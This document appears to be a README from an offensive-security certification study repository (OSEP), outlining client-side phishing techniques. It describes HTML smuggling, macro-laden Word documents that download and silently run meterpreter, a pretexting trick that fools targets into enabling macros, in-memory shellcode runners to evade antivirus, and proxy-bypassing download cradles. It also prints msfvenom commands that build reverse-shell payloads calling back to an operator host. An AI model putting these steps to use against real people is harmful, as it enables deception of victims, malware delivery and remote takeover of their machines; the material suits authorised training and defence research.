# OSEP-Rebirth

## Table of Content

* 1.0 [Client Side - Phishing Attacks](#CSPhishing)
  * 1.1 [HTML Smuggling](#Smuggling)
  * 1.2 [VBA - Phishing](#VBAPhishing)
  * 1.3 [VBA - PreTexting](#VBAPreTexting)
  * 1.4 [VBA - VBA Shellcode Runner](#VBARunner)
  * 1.5 [Powershell - Shellcode Runner](#PSRunner)
  * 1.6 [PowerShell - Reflection Shellcode Runner](#PSReflection)
  * 1.7 [PowerShell - Bypass Proxy](#PSProxy)
* 2.0 [Client Side Code Execution With Windows Script Host](#CSWSH)


# Client Side - Phishing Attacks<a name="CSPhishing"></a>


## HTML Smuggling<a name="Smuggling"></a>

### JavaScript code to trigger HTML Smuggling

* This technique will download a meterpreter payload once the web page is loaded by the user. (may be blocked by smart screen or other protections)

Codes can be found <a href="/Collections/1.0-Client_Side_Phishing_Attacks/1.1-HTML_Smuggling">here</a>


## VBA - Phishing<a name="VBAPhishing"></a>

* This techniques will run a macro (once user enable them), that will download on disk a meterpreter payload and execute it hidden from the user.
* Tested using Office 2016 Pro
* The document must be saved in a Macro-Enabled format such as ".doc" or ".docm". The newer ".docx" will not store macros.

Code can be found <a href="/Collections/1.0-Client_Side_Phishing_Attacks/1.2-VBA_Phishing">here</a>

1. Make a script to download the payload in powershell.
Here is how download a file in powershell.

2. Combining the piece with VBA. Make a macro that will pull the meterpreter executable from our web server when the document is opened and macro are enabled. The delay is to allow the file to completely download. Finally the file is executed hidden from the user.


## VBA - PreTexting<a name="VBAPreTexting"></a>

### The Old Switcheroo

* This technique is used to trick the user to press on the "Enable Editing" and "Enable Content" button to allow macro execution.

Code can be found <a href="/Collections/1.0-Client_Side_Phishing_Attacks/1.3-VBA_PreTexting">here</a>

1. Create an "encrypted" word page content, something in the idea "This file is encrypted, please Enable Editing and Enable content to decrypt it".
2. Make a copy of this word document.
3. Delete the content, and create your "decrypted" content. If you'r target work in human resource, make a CV as example.
4. Once the content created, select it and navigate to "Insert > Quick Parts > AutoTexts" and "Save Selection to AutoText Gallery.
5. Pick a name for the AutoText gallery.
6. Now that the content is stored, delete the content in the main text area and replace it with the content of our "encrypted" word document.
7. Create the VBA macro to replace the "encrypted" content with the "decrypted" content.

## VBA - VBA Shellcode Runner<a name="VBARunner"></a>

* This macro execute shellcode in memory by using Win32 APIs to avoid detection.
* Use the exit function "thread" while generating the payload to avoid word to close when the shellcode exit.
* If the victim close Word, our shell will die.

Code can be found <a href="/Collections/1.0-Client_Side_Phishing_Attacks/1.4-VBA_VBA_Shellcode_Runner">here</a>

1. Generate a msf payload formatted as vbapplication.
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.22 LPORT=443 EXITFUNC=thread -f vbapplication
```

2. Create the macro adding your generated array payload to it.


## PowerShell - Shellcode Runner<a name="PSRunner"></a>

* This macro download a PowerShell script and run it into memory. Then it will launch the PowerShell script as child process to avoid losing our shell once the victime close Microsoft Word. 

Code can be found <a href="/Collections/1.0-Client_Side_Phishing_Attacks/1.5-PowerShell_Shellcode_Runner">here</a>

1. Generate the shellcode in PowerShell format using msfvenom.
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.22 LPORT=443 EXITFUNC=thread -f ps1
```

2. Create "run.ps1" script.

3. Create the VBA macro which will download the ps1 code in memory and execute it.


## PowerShell - Reflection Shellcode Runner<a name="PSReflection"></a>

* This PowerShell script avoid creating artifacts on the hard drive that may be identified by Anti Virus.

Code can be found <a href="/Collections/1.0-Client_Side_Phishing_Attacks/1.6-PowerShell_Reflection_Shellcode_Runner">here</a>

1. Generate the shellcode in PowerShell format using msfvenom.
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.22 LPORT=443 EXITFUNC=thread -f ps1
```

2. Create "run.ps1" script.

3. Create the VBA macro which will download the ps1 code in memory and execute it.


## PowerShell - Bypass Proxy<a name="PSProxy"></a>

Code can be found <a href="/Collections/1.0-Client_Side_Phishing_Attacks/1.7-PowerShell_Bypass_Proxy">here</a>

### Proxy-Aware Communication
* Bypass proxy server when downloading file with PowerShell, by nulling the proxy settings 
* Customize User-Agent

### SYSTEM integrity proxy-aware download cradle

* Handle communication through a proxy, even as SYSTEM.
* HTTP request is routed through the proxy server and will allow our download cradle to call back to our C2 even when all traffic must go through the proxy.


# Client Side Code Execution With Windows Script Host<a name="CSWSH"></a>

